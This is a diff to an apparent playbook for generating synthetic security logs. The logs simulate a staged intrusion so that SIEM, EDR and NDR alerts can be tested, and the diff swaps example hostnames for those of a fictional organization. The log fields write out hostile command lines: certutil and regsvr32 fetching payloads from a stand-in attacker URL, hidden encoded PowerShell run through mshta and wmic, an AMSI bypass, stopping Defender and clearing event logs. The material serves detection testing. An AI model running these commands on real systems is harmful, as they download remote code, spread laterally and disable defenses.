@@ -71,20 +71,24 @@ empty. `compact=true` is lossless for this purpose and keeps the payload inside 
    "No installed data source covers the `<class>` class, so I am skipping Stage <N> (<stage name>). I will not generate it with a generic schema. Install a `<class>` data source from the Marketplace to include it."
 4. In your final report, list every stage you skipped or substituted and which of the alerts above will therefore not fire.
 
+## Pre-flight: read the organization
+
+An attack that starts inside runs from the outlier so it stands out against peers. Call `organization_get(section="personas")` for the outlier (person and workstation), `organization_get(section="hosts", filter="role=server")` for the SQL and file servers and `organization_get(section="hosts", filter="role=dc")` for the domain controller, and `organization_get(section="accounts", filter="kind=service")` for the abused service account. Do not invent a user, host or address. The recipes below show the Phantom Lab values; with another organization active, substitute its own.
+
 ## Narrative thread
 
-- **Compromised host:** `wks-foster-01` at `10.10.20.91`, user `g.foster`
-- **Lateral targets:** `dc01` at `10.10.10.10`, `sql01` at `10.10.40.20`, `fs01` at `10.10.50.20`
+- **Compromised host:** the outlier's workstation (`flag=outlier`) and its user. Phantom Lab example: PHWS-036 at `10.20.16.55`, user `aalzamil` (Anas Alzamil, DevOps Engineer).
+- **Lateral targets:** a domain controller, the SQL server and the file server. Phantom Lab example: PHDC01 at `10.20.0.10`, PHSRV-SQL01 at `10.20.1.22`, PHSRV-FS01 at `10.20.1.20`.
 - **Attacker remote staging URL (Stage 1):** `https://cdn-static-assets.gq/sw.ps1`
-- **Attacker C2 IP (Stage 2 lateral):** internal pivot through `dc01`, no external C2 in this skill's window
-- **Stolen credential being abused:** `svc_backup` (service account with admin rights on multiple servers — typical IT-tooling sprawl)
+- **Attacker C2 IP (Stage 2 lateral):** internal pivot through the domain controller (PHDC01), no external C2 in this skill's window
+- **Stolen credential being abused:** the backup service account of the organization (Phantom Lab: `svc-backup`, service account with admin rights on multiple servers — typical IT-tooling sprawl)
 - **Wall-clock time:** Stage 1 ~8 min (LOLBin execution chain). Stage 2 ~12 min (lateral). Stage 3 ~3 min (tamper before next pivot).
 
 ---
 
 ### Stage 1 — Signed-binary execution chain — ~12 events over 8 minutes
 
-The attacker on `wks-foster-01` runs a sequence of LOLBins:
+The attacker on the outlier's workstation (PHWS-036) runs a sequence of LOLBins:
 1. `certutil.exe -urlcache -f https://...` to download the next-stage script
 2. `mshta.exe vbscript:CreateObject(...)` to execute the inline payload from the response
 3. `wmic.exe process call create` to trigger remote execution on the discovered targets
@@ -101,16 +105,16 @@ xlog.create_data_worker:
   interval: 38
   destination: logdest:<id from log_destinations_list>
   observables_dict:
-    shost:        ["wks-foster-01"]
-    src:          ["10.10.20.91"]
-    suser:            ["g.foster"]
+    shost:        ["PHWS-036"]
+    src:          ["10.20.16.55"]
+    suser:            ["aalzamil"]
     sproc:    ["certutil.exe", "mshta.exe", "wmic.exe",
                       "rundll32.exe", "regsvr32.exe", "powershell.exe"]
     parentProcessName:  ["powershell.exe", "cmd.exe", "wmiprvse.exe"]
     commandLine:    ["certutil.exe -urlcache -f https://cdn-static-assets.gq/sw.ps1 C:\\Users\\Public\\sw.ps1",
                       "mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -nop -w hidden -ep bypass -c <encoded>\"\"\")(window.close)",
-                      "wmic.exe /node:dc01 process call create \"powershell.exe -nop -w hidden -ep bypass -enc <encoded>\"",
-                      "wmic.exe /node:sql01 process call create \"cmd.exe /c whoami /all > \\\\10.10.20.91\\C$\\Users\\Public\\out.txt\"",
+                      "wmic.exe /node:PHDC01 process call create \"powershell.exe -nop -w hidden -ep bypass -enc <encoded>\"",
+                      "wmic.exe /node:PHSRV-SQL01 process call create \"cmd.exe /c whoami /all > \\\\10.20.16.55\\C$\\Users\\Public\\out.txt\"",
                       "rundll32.exe C:\\Users\\Public\\sw.dll,EntryPoint",
                       "regsvr32.exe /s /n /u /i:https://cdn-static-assets.gq/scrobj.sct scrobj.dll"]
     filePath:       ["C:\\Windows\\System32\\certutil.exe",
@@ -121,7 +125,7 @@ xlog.create_data_worker:
     signature:  ["valid", "valid", "valid", "valid", "valid"]
     signer:     ["Microsoft Windows", "Microsoft Windows", "Microsoft Windows"]
     fname:          ["C:\\Users\\Public\\sw.ps1", "C:\\Users\\Public\\sw.dll", ""]
-    dhost:     ["", "", "dc01", "sql01", ""]
+    dhost:     ["", "", "PHDC01", "PHSRV-SQL01", ""]
     act:          ["process_create", "remote_process_create", "file_download"]
     cefSeverity:        ["high", "critical"]
     alertName:      ["LOLBin certutil used as URL downloader",
@@ -149,7 +153,7 @@ xlog.create_data_worker:
 
 ### Stage 2 — Lateral movement: NDR sees east-west SMB/RPC anomaly — ~80 events over 12 minutes
 
-The WMI remote-process calls in Stage 1 generated outbound RPC and SMB to `dc01`, `sql01`, `fs01`. NDR — which has been baselining `wks-foster-01`'s normal traffic for weeks — sees the workstation suddenly making admin-share connections to multiple servers, and flags the deviation.
+The WMI remote-process calls in Stage 1 generated outbound RPC and SMB to PHDC01, PHSRV-SQL01 and PHSRV-FS01. NDR — which has been baselining PHWS-036's normal traffic for weeks — sees the workstation suddenly making admin-share connections to multiple servers, and flags the deviation.
 
 **Data class:** `ndr`
 
@@ -162,10 +166,10 @@ xlog.create_data_worker:
   interval: 9
   destination: logdest:<id from log_destinations_list>
   observables_dict:
-    src:        ["10.10.20.91"]
-    shost:      ["wks-foster-01"]
-    dst:        ["10.10.10.10", "10.10.40.20", "10.10.50.20"]
-    dhost:      ["dc01", "sql01", "fs01"]
+    src:        ["10.20.16.55"]
+    shost:      ["PHWS-036"]
+    dst:        ["10.20.0.10", "10.20.1.22", "10.20.1.20"]
+    dhost:      ["PHDC01", "PHSRV-SQL01", "PHSRV-FS01"]
     dpt:      ["445", "139", "135", "5985", "5986", "1433"]
     proto:      ["6"]
     act:        ["alert", "monitor"]
@@ -183,25 +187,25 @@ xlog.create_data_worker:
     attackType:     ["smb_admin_access", "wmi_remote_exec", "winrm_lateral"]
     out:     ["240", "1024", "4096", "8192", "16384"]
     in: ["180", "512", "2048", "8192"]
-    suser:   ["g.foster", "svc_backup"]
+    suser:   ["aalzamil", "svc-backup"]
     mitreTechnique: ["T1021.002", "T1047", "T1021.006"]
 ```
 
 **Field semantics:**
 - `dst_port` covers the lateral-movement port quartet: `445` (SMB), `139` (NetBIOS, often correlated), `135` (RPC endpoint mapper, used by WMI), `5985/5986` (WinRM), `1433` (MSSQL — for SQL-server lateral)
-- `account_name: ['g.foster', 'svc_backup']` — two accounts visible in the traffic. `g.foster` is the foothold user; `svc_backup` is the service account being abused for lateral (NDR sees the auth via the SMB session setup)
+- `account_name: ['aalzamil', 'svc-backup']` — two accounts visible in the traffic. `aalzamil` (the outlier) is the foothold user; `svc-backup` is the service account being abused for lateral (NDR sees the auth via the SMB session setup)
 - `anomaly_score: 72-94` — the higher scores fire on the "first time this workstation has done X" baseline-deviation
 - `alert_name` provides realistic NDR alert text the SIEM displays
 
-**Why this fires Rule #12:** every NDR product has a "first time host A talks to host B on port C" baseline detection. A workstation suddenly making SMB+RPC+WinRM connections to 3 different servers within minutes deviates dramatically from baseline. Combined with the username pivot (`g.foster` → `svc_backup`), this fires high-confidence lateral-movement findings.
+**Why this fires Rule #12:** every NDR product has a "first time host A talks to host B on port C" baseline detection. A workstation suddenly making SMB+RPC+WinRM connections to 3 different servers within minutes deviates dramatically from baseline. Combined with the username pivot (`aalzamil` → `svc-backup`), this fires high-confidence lateral-movement findings.
 
 ---
 
 ### Stage 3 — Defense evasion before next pivot — ~5 events over 90 seconds
 
-The attacker, having pivoted to `dc01` and `sql01`, prepares the next move by tampering with security tools on those hosts. Three patterns:
+The attacker, having pivoted to PHDC01 and PHSRV-SQL01, prepares the next move by tampering with security tools on those hosts. Three patterns:
 - AMSI bypass (PowerShell command that disables AMSI for the current process)
-- WinDefend service stop on `sql01`
+- WinDefend service stop on PHSRV-SQL01
 - Event log clearing (covers tracks)
 
 **Data class:** `edr`
@@ -215,9 +219,9 @@ xlog.create_data_worker:
   interval: 18
   destination: logdest:<id from log_destinations_list>
   observables_dict:
-    shost:        ["sql01", "dc01", "wks-foster-01"]
-    src:          ["10.10.40.20", "10.10.10.10", "10.10.20.91"]
-    suser:            ["svc_backup", "g.foster", "SYSTEM"]
+    shost:        ["PHSRV-SQL01", "PHDC01", "PHWS-036"]
+    src:          ["10.20.1.22", "10.20.0.10", "10.20.16.55"]
+    suser:            ["svc-backup", "aalzamil", "SYSTEM"]
     sproc:    ["powershell.exe", "sc.exe", "wevtutil.exe"]
     parentProcessName:  ["wmiprvse.exe", "powershell.exe"]
     commandLine:    ["powershell.exe [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
@@ -241,7 +245,7 @@ xlog.create_data_worker:
 - The AMSI bypass uses the well-known reflection technique to set the `amsiInitFailed` field. `Ref.Assembly.GetType('System.Management.Automation.AmsiUtils')` is the canonical pattern — recent EDR products detect the string match in command-line, even though the reflection itself succeeds
 - `wevtutil cl Security` clears the Security event log (anti-forensics). Modern systems also log the clear-event itself in EventID 1102, which the EDR forwards
 - `service_state: stopped` for `WinDefend` — the canonical Defender-disable signal
-- The events span THREE hosts (`wks-foster-01` for the AMSI bypass, `sql01` for WinDefend stop, `dc01` for log clear) — showing the attacker's movement is also reflected in tamper events on each host they pivot to
+- The events span THREE hosts (PHWS-036 for the AMSI bypass, PHSRV-SQL01 for WinDefend stop, PHDC01 for log clear) — showing the attacker's movement is also reflected in tamper events on each host they pivot to
 
 **Why this fires Rule #19:** AMSI bypass is a high-fidelity EDR alert in any modern product. WinDefend service stop is universally detected. Event log clearing fires both EDR and OS-level alerts. Three independent tamper events on three different hosts within 90s is unmistakable; SIEMs roll this up into a "post-exploitation defense evasion campaign" incident.
 
@@ -251,13 +255,13 @@ xlog.create_data_worker:
 
 | Indicator | Where to check |
 |---|---|
-| LOLBin alert: certutil URL downloader from `wks-foster-01` | XSIAM Issues |
+| LOLBin alert: certutil URL downloader from PHWS-036 | XSIAM Issues |
 | LOLBin alert: WMIC remote process creation | XSIAM Issues |
-| Lateral-movement alert: `wks-foster-01` → `dc01`/`sql01`/`fs01` | XSIAM Issues |
+| Lateral-movement alert: PHWS-036 → PHDC01/PHSRV-SQL01/PHSRV-FS01 | XSIAM Issues |
 | AMSI bypass alert | XSIAM Issues |
 | WinDefend service-stop alert | XSIAM Issues |
 | Event-log-cleared alert | XSIAM Issues |
-| Pivotable: filter by user=`g.foster` OR host=`wks-foster-01`, see all 3 stages | XQL: `config timeframe = 24h \| dataset = <dataset_name of the edr entry> \| filter <its user field> = "g.foster" \| limit 20` |
+| Pivotable: filter by user=`aalzamil` OR host=`PHWS-036`, see all 3 stages | XQL: `config timeframe = 24h \| dataset = <dataset_name of the edr entry> \| filter <its user field> = "aalzamil" \| limit 20` |
 
 ## Tear-down
 
@@ -269,4 +273,4 @@ xlog.kill_worker:
 
 ## Adapting per deployment
 
-The lateral targets `dc01` / `sql01` / `fs01` are illustrative. For a real exercise, replace with hostnames from the customer's actual asset inventory (3 servers their attackers would plausibly pivot to) so the lateral-movement alerts also enrich with the customer's CMDB context.
+The compromised host, the lateral targets and the abused service account come from the active organization (`organization_get`). To pivot to different servers, pick them from `section=hosts filter=role=server` (for example PHSRV-APP01 or PHSRV-BKP01) and keep the three-target shape; if the organization lacks a server the operator wants, tell them and offer `organization_update`.
